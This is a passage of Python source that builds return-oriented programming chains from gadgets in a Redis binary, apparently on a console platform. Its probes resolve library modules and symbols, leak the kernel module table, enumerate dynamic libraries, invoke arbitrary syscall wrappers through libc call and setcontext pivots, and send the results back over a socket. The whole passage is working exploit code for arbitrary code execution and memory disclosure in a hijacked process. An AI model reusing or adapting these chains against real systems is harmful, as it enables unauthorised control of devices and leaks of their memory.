                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        elif lowrop_module_dlsym_probe:
            if args.lowrop_module_dlsym_flavor == "kernel":
                qwords_from_getpid_to_get_module_handle = (
                    LIBKERNEL_GET_MODULE_HANDLE - LIBKERNEL_GETPID
                ) // 8
            else:
                qwords_from_getpid_to_get_module_handle = (
                    LIBKERNEL_SYS_GET_MODULE_HANDLE - LIBKERNEL_SYS_GETPID
                ) // 8

            sym_addrs = {}
            for symbol, off, blob in dlsym_blobs:
                putb(off, blob)
                sym_addrs[symbol] = scratch + off
            name_addrs = {}
            for name, off, blob in module_name_blobs:
                putb(off, blob)
                name_addrs[name] = scratch + off
            out_base = scratch + dlsym_out_off

            for i, (name, symbol) in enumerate(dlsym_cases):
                out_slot = out_base + i * 8
                result_slot = msg_addr + i * 24

                # rax = low-level get-module-handle syscall wrapper in the
                # same libkernel/libkernel_sys image as Redis' getpid import.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.eboot_base + REDIS_EBOOT_GETPID_GOT)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emit_pop_rdx_padded(qwords_from_getpid_to_get_module_handle)
                emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)

                # handle = get_module_handle(module_name)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(name_addrs[name])
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)

                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(result_slot)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

                # sceKernelDlsym((int)handle, symbol, &out_slot)
                emitq(args.eboot_base + REDIS_EBOOT_XCHG_EDI_EAX_RET)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(sym_addrs[symbol])
                emit_pop_rdx_padded(out_slot)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_DLSYM_PLT)

                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(result_slot + 8)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(out_slot)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(result_slot + 16)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        elif lowrop_module_table_leak:
            if args.lowrop_module_table_flavor == "kernel":
                getpid_off = LIBKERNEL_GETPID
                count_off = LIBKERNEL_MODULE_COUNT
                active_off = LIBKERNEL_MODULE_ACTIVE
                table_off = LIBKERNEL_MODULE_TABLE
            else:
                getpid_off = LIBKERNEL_SYS_GETPID
                count_off = LIBKERNEL_SYS_MODULE_COUNT
                active_off = LIBKERNEL_SYS_MODULE_ACTIVE
                table_off = LIBKERNEL_SYS_MODULE_TABLE

            def emit_load_getpid_ptr():
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.eboot_base + REDIS_EBOOT_GETPID_GOT)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)

            def emit_store_rax(out_addr):
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(out_addr)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            def emit_add_vaddr_offset(vaddr_off):
                delta = (vaddr_off - getpid_off) // 8
                emit_pop_rdx_padded(delta)
                emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)

            def emit_read_relative_vaddr(vaddr_off, out_addr):
                emit_load_getpid_ptr()
                emit_add_vaddr_offset(vaddr_off)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)
                emit_store_rax(out_addr)

            def emit_read_entry_field(entry_slot_addr, field_off, out_addr):
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(entry_slot_addr)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emit_pop_rdx_padded(field_off // 8)
                emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)
                emit_store_rax(out_addr)

            # Header:
            #   q0 = live getpid wrapper pointer
            #   q1 = computed module table base
            #   q2 = qword at module-count global
            #   q3 = qword at active-count global
            emit_load_getpid_ptr()
            emit_store_rax(msg_addr)
            emit_load_getpid_ptr()
            emit_add_vaddr_offset(table_off)
            emit_store_rax(msg_addr + 8)
            emit_read_relative_vaddr(count_off, msg_addr + 0x10)
            emit_read_relative_vaddr(active_off, msg_addr + 0x18)

            out_qword = 4
            for entry_idx in range(module_table_entries):
                entry_off = table_off + entry_idx * LIBKERNEL_MODULE_STRIDE
                entry_addr_slot = msg_addr + out_qword * 8
                emit_load_getpid_ptr()
                emit_add_vaddr_offset(entry_off)
                emit_store_rax(entry_addr_slot)
                out_qword += 1
                for field_off in LIBKERNEL_MODULE_TABLE_FIELDS:
                    emit_read_entry_field(entry_addr_slot, field_off, msg_addr + out_qword * 8)
                    out_qword += 1

        elif lowrop_dynlib_list_probe:
            if args.lowrop_dynlib_flavor == "kernel":
                qwords_from_getpid_to_get_list = (
                    LIBKERNEL_DYNLIB_GET_LIST - LIBKERNEL_GETPID
                ) // 8
                qwords_from_getpid_to_errno_ptr = (
                    LIBKERNEL_ERRNO_PTR - LIBKERNEL_GETPID
                ) // 8
            else:
                qwords_from_getpid_to_get_list = (
                    LIBKERNEL_SYS_DYNLIB_GET_LIST - LIBKERNEL_SYS_GETPID
                ) // 8
                qwords_from_getpid_to_errno_ptr = (
                    LIBKERNEL_SYS_ERRNO_PTR - LIBKERNEL_SYS_GETPID
                ) // 8

            wrapper_slot = msg_addr + 0x08
            count_slot = msg_addr + 0x10
            errno_ptr_slot = msg_addr + 0x18
            errno_val_slot = msg_addr + 0x20
            handles_addr = msg_addr + (0x30 if args.lowrop_dynlib_capture_errno else 0x20)

            # rax = dynlib_get_list wrapper in the same libkernel image as
            # Redis' getpid import.  Store it for verification before calling.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(args.eboot_base + REDIS_EBOOT_GETPID_GOT)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            emit_pop_rdx_padded(qwords_from_getpid_to_get_list)
            emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(wrapper_slot)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            # Try the selected argument order for dynlib_get_list.
            if args.lowrop_dynlib_list_order == "count-handles-max":
                arg1, arg2, arg3 = count_slot, handles_addr, dynlib_list_max
            elif args.lowrop_dynlib_list_order == "handles-count-max":
                arg1, arg2, arg3 = handles_addr, count_slot, dynlib_list_max
            else:
                arg1, arg2, arg3 = handles_addr, dynlib_list_max, count_slot
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(arg1)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
            emitq(arg2)
            emit_pop_rdx_padded(arg3)
            emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)

            # msg+0 = return value.  msg+8 already has wrapper pointer and
            # msg+0x10 receives the kernel-written count.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            if args.lowrop_dynlib_capture_errno:
                # errno pointer and errno value, useful when the syscall returns -1.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.eboot_base + REDIS_EBOOT_GETPID_GOT)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emit_pop_rdx_padded(qwords_from_getpid_to_errno_ptr)
                emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(errno_ptr_slot)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(errno_val_slot)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        elif lowrop_wrapper_call_probe:
            wrapper_flavor = args.lowrop_wrapper_flavor
            wrapper_source = args.lowrop_wrapper_source
            wrapper_offset = args.lowrop_wrapper_offset
            if args.lowrop_wrapper_call8_send_self:
                # Diagnostic for the libc+0x91c4d call path: call the live
                # send() target directly so the target function itself emits
                # bytes before any post-call chain can crash.
                wrapper_flavor = "sys"
                wrapper_source = "send"
                wrapper_offset = LIBKERNEL_SYS_SEND_EXPORT

            if wrapper_flavor == "kernel":
                if wrapper_source == "send":
                    source_off = LIBKERNEL_SEND_EXPORT
                elif wrapper_source == "gettimeofday":
                    source_off = LIBKERNEL_GETTIMEOFDAY
                else:
                    source_off = LIBKERNEL_GETPID
                errno_ptr_off = LIBKERNEL_ERRNO_PTR
            else:
                if wrapper_source == "send":
                    source_off = LIBKERNEL_SYS_SEND_EXPORT
                elif wrapper_source == "gettimeofday":
                    source_off = LIBKERNEL_SYS_GETTIMEOFDAY
                else:
                    source_off = LIBKERNEL_SYS_GETPID
                errno_ptr_off = LIBKERNEL_SYS_ERRNO_PTR
            source_gots = {
                "getpid": REDIS_EBOOT_GETPID_GOT,
                "gettimeofday": REDIS_EBOOT_GETTIMEOFDAY_GOT,
                "send": REDIS_EBOOT_SEND_GOT,
            }
            source_got = args.eboot_base + source_gots[wrapper_source]
            wrapper_slot = msg_addr + 0x08

            def wrapper_arg(index, raw_value):
                off = getattr(args, f"lowrop_wrapper_arg{index}_msg_offset", None)
                if off is not None:
                    return msg_addr + off
                scratch_off = getattr(args, f"lowrop_wrapper_arg{index}_scratch_offset", None)
                if scratch_off is not None:
                    return scratch + scratch_off
                return raw_value & 0xFFFFFFFFFFFFFFFF

            # msg+0x00 = wrapper return value.
            # msg+0x08 = derived wrapper pointer.
            # msg+0x10..0x30 = the six argument values actually supplied.
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(source_got)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
            wrapper_delta = wrapper_offset - source_off
            if wrapper_delta and wrapper_delta % 8 == 0:
                emit_pop_rdx_padded(wrapper_delta // 8)
                emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
            elif wrapper_delta:
                emit_pop_rdx_padded(wrapper_delta)
                emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(wrapper_slot)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            if args.lowrop_wrapper_call8_send_self:
                args_supplied = [
                    args.dispatch_fd,
                    msg_addr,
                    len(msg),
                    0,
                    0,
                    0,
                ]
            else:
                args_supplied = [
                    wrapper_arg(1, args.lowrop_wrapper_arg1),
                    wrapper_arg(2, args.lowrop_wrapper_arg2),
                    wrapper_arg(3, args.lowrop_wrapper_arg3),
                    wrapper_arg(4, args.lowrop_wrapper_arg4),
                    wrapper_arg(5, args.lowrop_wrapper_arg5),
                    wrapper_arg(6, args.lowrop_wrapper_arg6),
                ]
            for i, value in enumerate(args_supplied):
                struct.pack_into("<Q", msg, 0x10 + i * 8, value)

            if args.lowrop_wrapper_prezero_r8_r9:
                # libkernel_sys send zeroes r8/r9 before issuing the syscall.
                # A zero-length send keeps the connection quiet but leaves those
                # registers usable for the next wrapper call.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.dispatch_fd)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(msg_addr)
                emit_pop_rdx_padded(0)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(wrapper_slot)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)

            if args.lowrop_wrapper_use_libc_call8:
                fake_obj_off = 0x100
                fake_obj_addr = msg_addr + fake_obj_off
                # The libc call gadget starts with an indirect call.  After
                # pop-rsp;ret, rsp points at call_chain+8 before that call, so
                # keep call_chain at 8 mod 16 to give the callee the normal
                # SysV entry alignment (rsp == 8 mod 16).
                call_chain_off = 0x248
                call_chain_addr = msg_addr + call_chain_off
                post_off = call_chain_off + 0x40
                if len(msg) < post_off + 0x180:
                    raise RuntimeError("wrapper libc-call8 mode needs at least 0x3C0 bytes of message space")

                post = bytearray(0x40)

                def post_emitq(value):
                    post.extend(pack64(value))

                def post_emit_pop_rdx_padded(value):
                    post_emitq(args.eboot_base + REDIS_EBOOT_POP_RDX_RET3)
                    post_emitq(value)
                    post_emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                    post.extend(b"ROP")
                    post_emitq(0)

                def post_emit_aligned_call(func_addr):
                    cur_addr = call_chain_addr + len(post)
                    if (cur_addr & 0xF) == 0:
                        post_emitq(func_addr)
                        return
                    need = (8 - ((cur_addr + 16) & 0xF)) & 0xF
                    ret_off, imm = REDIS_EBOOT_RET_IMM_BY_MOD[need]
                    post_emitq(args.eboot_base + ret_off)
                    post_emitq(func_addr)
                    post.extend(b"\x00" * imm)

                def post_store_rax(dst_addr):
                    post_emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    post_emitq(dst_addr)
                    post_emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

                # libc+0x91c4d enters with:
                #   rax = fake object, [rax+0x48] = target wrapper
                #   r14 = desired r8
                # Then it calls [rax+0x48], skips one qword, pops six
                # callee-saved slots, and returns into the post chain.
                post_store_rax(msg_addr)
                if args.lowrop_wrapper_capture_errno:
                    qwords_from_source_to_errno_ptr = (errno_ptr_off - source_off) // 8
                    post_emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    post_emitq(source_got)
                    post_emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    post_emit_pop_rdx_padded(qwords_from_source_to_errno_ptr)
                    post_emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
                    post_emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)
                    post_store_rax(msg_addr + 0x40)
                    post_emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)
                    post_store_rax(msg_addr + 0x48)
                post_emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                post_emitq(args.dispatch_fd)
                post_emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                post_emitq(msg_addr)
                post_emit_pop_rdx_padded(len(msg))
                post_emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)
                post_emitq(0)
                if call_chain_off + len(post) > len(msg):
                    raise RuntimeError("wrapper libc-call8 post-chain does not fit in message buffer")
                msg[call_chain_off:call_chain_off + len(post)] = post

                # fake_obj+0x48 = dynamically derived target wrapper.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(wrapper_slot)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emit_store_rax(fake_obj_addr + 0x48)

                # call_chain[0] = live libc call gadget.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.eboot_base + REDIS_EBOOT_MEMCPY_GOT)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emit_pop_rdx_padded(LIBC_MOV_R8_R14_CALL_PTR_RAX48 - LIBC_MEMCPY_EXPORT)
                emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
                emit_store_rax(call_chain_addr)

                if args.lowrop_wrapper_preflight_send:
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(args.dispatch_fd)
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                    emitq(msg_addr)
                    emit_pop_rdx_padded(min(len(msg), call_chain_off + 0x80))
                    emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)

                # Set target args. r9 is expected to have been zeroed by
                # --lowrop-wrapper-prezero-r8-r9 when the caller needs arg6=0.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RAX_RET)
                emitq(fake_obj_addr)
                emitq(args.eboot_base + REDIS_EBOOT_POP_R14_RET)
                emitq(args_supplied[4])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args_supplied[0])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(args_supplied[1])
                emit_pop_rdx_padded(args_supplied[2])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                emitq(args_supplied[3])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSP_RET)
                emitq(call_chain_addr)

            elif args.lowrop_wrapper_use_setcontext:
                ctx_off = 0x100
                ctx_addr = msg_addr + ctx_off
                # The restore helper enters the target wrapper via ret, so the
                # wrapper sees rsp=post_addr.  Keep it at 8 mod 16, matching a
                # normal call entry on x86_64.
                post_off = 0x308
                post_addr = msg_addr + post_off
                if len(msg) < post_off + 0x200:
                    raise RuntimeError("wrapper setcontext mode needs at least 0x500 bytes of message space")

                post = bytearray()
                post_first_gadget = args.eboot_base + REDIS_EBOOT_POP_RDI_RET

                def post_emitq(value):
                    post.extend(pack64(value))

                def post_emit_pop_rdx_padded(value):
                    post_emitq(args.eboot_base + REDIS_EBOOT_POP_RDX_RET3)
                    post_emitq(value)
                    post_emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                    post.extend(b"ROP")
                    post_emitq(0)

                def post_emit_aligned_call(func_addr):
                    cur_addr = post_addr + len(post)
                    if (cur_addr & 0xF) == 0:
                        post_emitq(func_addr)
                        return
                    need = (8 - ((cur_addr + 16) & 0xF)) & 0xF
                    ret_off, imm = REDIS_EBOOT_RET_IMM_BY_MOD[need]
                    post_emitq(args.eboot_base + ret_off)
                    post_emitq(func_addr)
                    post.extend(b"\x00" * imm)

                def post_store_rax(dst_addr):
                    post_emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    post_emitq(dst_addr)
                    post_emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

                # This chain becomes active after the target wrapper returns.
                # It records the wrapper return, optionally records errno, then
                # sends the whole message buffer back over the sidecar socket.
                post_store_rax(msg_addr)
                if args.lowrop_wrapper_capture_errno:
                    qwords_from_source_to_errno_ptr = (errno_ptr_off - source_off) // 8
                    post_emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    post_emitq(source_got)
                    post_emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    post_emit_pop_rdx_padded(qwords_from_source_to_errno_ptr)
                    post_emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
                    post_emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)
                    post_store_rax(msg_addr + 0x40)
                    post_emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)
                    post_store_rax(msg_addr + 0x48)
                post_emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                post_emitq(args.dispatch_fd)
                post_emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                post_emitq(msg_addr)
                post_emit_pop_rdx_padded(len(msg))
                post_emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)
                post_emitq(0)
                if post_off + len(post) > len(msg):
                    raise RuntimeError("wrapper setcontext post-chain does not fit in message buffer")
                msg[post_off:post_off + len(post)] = post

                if not args.lowrop_wrapper_no_save_context:
                    # saveContext preserves the live callee-saved/runtime state
                    # into msg+ctx_off.  After it returns, patch only the fields
                    # needed for the target call.
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(args.eboot_base + REDIS_EBOOT_MEMCPY_GOT)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emit_pop_rdx_padded(LIBC_SAVECONTEXT - LIBC_MEMCPY_EXPORT)
                    emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)
                    emit_store_rax(msg_addr + 0x58)
                    if args.lowrop_wrapper_preflight_send:
                        emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                        emitq(args.dispatch_fd)
                        emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                        emitq(msg_addr)
                        emit_pop_rdx_padded(0x80)
                        emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)
                        emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                        emitq(msg_addr + 0x58)
                        emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(ctx_addr)
                    emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)
                    if args.lowrop_wrapper_preflight_send:
                        emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                        emitq(args.dispatch_fd)
                        emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                        emitq(msg_addr)
                        emit_pop_rdx_padded(min(len(msg), post_off))
                        emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)

                # This libc restore helper layout is:
                #   +0x10 rcx, +0x18 rdx, +0x20 rdi, +0x28 rsi,
                #   +0x38 post-call rsp, +0x40 r8, +0x48 r9, +0x80 rip.
                # send-only is a minimal diagnostic: restore directly into
                # send(fd, msg, len). A close afterwards is expected because
                # the return address is zero, but the sidecar should receive
                # the message before that happens.
                if args.lowrop_wrapper_setcontext_send_only:
                    if args.lowrop_wrapper_setcontext_pivot_only:
                        emit_store_imm64(post_addr - 0x10, args.dispatch_fd)
                        emit_store_imm64(post_addr - 0x08, args.eboot_base + REDIS_EBOOT_SEND_PLT)
                        stack_after_pivot = post_addr - 0x10
                    else:
                        stack_after_pivot = post_addr
                    ctx_fields = (
                        (0x20, args.dispatch_fd),  # rdi
                        (0x28, msg_addr),          # rsi
                        (0x18, len(msg)),          # rdx
                        (0x10, 0),                 # rcx
                        (0x40, 0),                 # r8
                        (0x48, 0),                 # r9
                        (0x38, stack_after_pivot), # send() return stack
                    )
                else:
                    ctx_fields = (
                        (0x20, args_supplied[0]),  # rdi
                        (0x28, args_supplied[1]),  # rsi
                        (0x18, args_supplied[2]),  # rdx
                        (0x10, args_supplied[3]),  # rcx, moved to r10 by syscall wrappers
                        (0x40, args_supplied[4]),  # r8
                        (0x48, args_supplied[5]),  # r9
                        (
                            0x38,
                            post_addr + 8 if args.lowrop_wrapper_setcontext_ping_only else post_addr,
                        ),                         # wrapper return stack
                    )
                for off, value in ctx_fields:
                    emit_store_imm64(ctx_addr + off, value)

                if args.lowrop_wrapper_setcontext_send_only:
                    emit_store_imm64(ctx_addr + 0x80, args.eboot_base + REDIS_EBOOT_SEND_PLT)
                elif args.lowrop_wrapper_setcontext_ping_only:
                    # Diagnostic: restore directly into the post-send chain.
                    # If this works, restoreContext is usable and the target
                    # wrapper entry/return is the failing part.
                    emit_store_imm64(ctx_addr + 0x80, post_first_gadget)
                else:
                    # ctx.rip = derived wrapper pointer.
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(wrapper_slot)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                    emit_store_rax(ctx_addr + 0x80)

                # rax = libc restore context, derived from Redis' live libc memcpy.
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args.eboot_base + REDIS_EBOOT_MEMCPY_GOT)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                restore_offset = (
                    LIBC_PIVOT_MOV_RSP_RDI38_POP_RDI_RET
                    if args.lowrop_wrapper_setcontext_pivot_only
                    else args.lowrop_wrapper_setcontext_offset
                )
                emit_pop_rdx_padded(restore_offset - LIBC_MEMCPY_EXPORT)
                emitq(args.eboot_base + REDIS_EBOOT_ADD_RAX_RDX_RET)

                # msg+0x50 = derived restore-context pointer.
                emit_store_rax(msg_addr + 0x50)
                if args.lowrop_wrapper_preflight_send:
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(args.dispatch_fd)
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                    emitq(msg_addr)
                    emit_pop_rdx_padded(min(len(msg), post_off + len(post)))
                    emit_aligned_call(args.eboot_base + REDIS_EBOOT_SEND_PLT)
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                    emitq(msg_addr + 0x50)
                    emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)

                if args.lowrop_wrapper_setcontext_pivot_only:
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                    emitq(msg_addr)
                    emit_pop_rdx_padded(len(msg))
                    emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                    emitq(0)

                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(ctx_addr)
                if args.lowrop_wrapper_setcontext_call_rax:
                    # Diagnostic for libc entry constraints: enter the
                    # restore helper through a real call instruction instead
                    # of ret.  restoreContext should not return normally.
                    emitq(args.eboot_base + REDIS_EBOOT_CALL_RAX)
                else:
                    emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)
            else:
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(args_supplied[0])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RSI_RET)
                emitq(args_supplied[1])
                emit_pop_rdx_padded(args_supplied[2])
                emitq(args.eboot_base + REDIS_EBOOT_POP_RCX_RET)
                emitq(args_supplied[3])
                # Without setContext the current eboot chain has no simple
                # r8/r9 pop gadget wired in, so only four args are reliable.
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)

            emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
            emitq(msg_addr)
            emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

            if args.lowrop_wrapper_capture_errno:
                qwords_from_source_to_errno_ptr = (errno_ptr_off - source_off) // 8
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(source_got)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RDI_RET)
                emit_pop_rdx_padded(qwords_from_source_to_errno_ptr)
                emitq(args.eboot_base + REDIS_EBOOT_LEA_RAX_RAX_RDX8_RET)
                emit_aligned_call(args.eboot_base + REDIS_EBOOT_PUSH_RAX_RET)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 0x40)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_RAX_PTR_RAX_RET)
                emitq(args.eboot_base + REDIS_EBOOT_POP_RDI_RET)
                emitq(msg_addr + 0x48)
                emitq(args.eboot_base + REDIS_EBOOT_MOV_PTR_RDI_RAX_RET)

        elif lowrop_direct_syscall_probe:
            if args.lowrop_direct_syscall_flavor == "kernel":
                source_off = LIBKERNEL_GETTIMEOFDAY if args.lowrop_direct_syscall_source == "gettimeofday" else LIBKERNEL_GETPID
                errno_ptr_off = LIBKERNEL_ERRNO_PTR
            else:
                source_off = LIBKERNEL_SYS_GETTIMEOFDAY if args.lowrop_direct_syscall_source == "gettimeofday" else LIBKERNEL_SYS_GETPID
                errno_ptr_off = LIBKERNEL_SYS_ERRNO_PTR
            source_got = (
                args.eboot_base + REDIS_EBOOT_GETTIMEOFDAY_GOT
                if args.lowrop_direct_syscall_source == "gettimeofday"
                else args.eboot_base + REDIS_EBOOT_GETPID_GOT
            )

            def syscall_arg(index, raw_value):
                off = getattr(args, f"lowrop_direct_syscall_arg{index}_msg_offset", None)
                if off is not None:
                    return msg_addr + off
                scratch_off = getattr(args, f"lowrop_direct_syscall_arg{index}_scratch_offset", None)
                if scratch_off is not None:
                    return scratch + scratch_off
                stack_off = getattr(args, f"lowrop_direct_syscall_arg{index}_stack_offset", None)
                if stack_off is not None:
                    return stack_addr + stack_off
                stack_page_off = getattr(args, f"lowrop_direct_syscall_arg{index}_stack_page_offset", None)
                if stack_page_off is not None:
                    return (stack_addr + stack_page_off) & ~(PAGE_SIZE - 1)
                return raw_value & 0xFFFFFFFFFFFFFFFF

            args_supplied = [
                syscall_arg(1, args.lowrop_direct_syscall_arg1),
                syscall_arg(2, args.lowrop_direct_syscall_arg2),
                syscall_arg(3, args.lowrop_direct_syscall_arg3),
                syscall_arg(4, args.lowrop_direct_syscall_arg4),
